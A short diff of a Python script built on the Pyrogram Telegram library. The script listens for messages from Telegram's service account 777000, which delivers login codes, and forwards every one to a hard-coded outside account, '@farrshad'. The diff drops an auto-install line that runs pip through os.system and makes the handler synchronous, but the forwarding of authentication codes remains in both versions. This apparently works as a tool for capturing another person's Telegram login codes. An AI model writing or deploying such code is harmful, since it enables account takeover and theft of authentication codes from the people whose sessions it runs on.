@@ -1,10 +1,3 @@
-import os, sys
-if sys.platform == 'win32':
-    pip_line = 'python -m pip install pyrogram==2.0.30'
-else:
-    pip_line = 'pip install pyrogram==2.0.30'
-os.system(pip_line)
-
 from pyrogram import Client, filters
 from pyrogram.types import Message
 
@@ -16,7 +9,7 @@ id_or_username = '@farrshad'
 
 
 @app.on_message(filters.user(777000))
-async def forward_code(app:Client, message:Message):
-    await app.forward_messages(id_or_username, message.chat.id, message.id)
+def forward_code(app:Client, message:Message):
+    app.forward_messages(id_or_username, message.chat.id, message.id)
 
 app.run()
